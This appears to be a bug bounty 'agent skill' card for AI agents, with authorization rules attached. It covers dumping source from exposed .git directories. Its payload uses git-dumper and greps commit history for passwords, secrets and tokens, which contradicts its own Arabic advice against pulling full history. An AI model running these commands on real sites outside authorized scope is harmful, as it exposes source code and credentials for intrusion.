# SKILL: .git/config exposed → full source dump with git-dumper (\$500–\$3500+ real cases)

**Skill id:** `tip/gitconfig-exposed-full-source-dump-with-git-dumper-5003500-real-cases`  
**Category:** Recon  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e880810eb751ddc60e17a198  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

كشف .git/config قد يسمح باستنتاج إعدادات أو يؤكد أن مسارًا من مستودع Git مكشوف، لكنه لا يثبت تلقائيًا إمكانية سحب المستودع كاملًا أو وجود أسرار صالحة. ابدأ بطلب قراءة محدود وغير حساس، ثم وثّق الأثر دون استخراج تاريخ كامل أو استخدام أي credentials مكتشفة.

## Payload / Code

```
curl -I [https://target.com/.git/config](https://target.com/.git/config)
git-dumper [https://target.com/.git/](https://target.com/.git/) ./dump
cd dump && git log -p \| grep -iE 'password\|secret\|api\_key\|token'
```

## Source

Multiple 2025 writeups: Ibtissam \$3500, Syed €1000, Abhi Sharma \$500, Sudarshana RCE chain

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
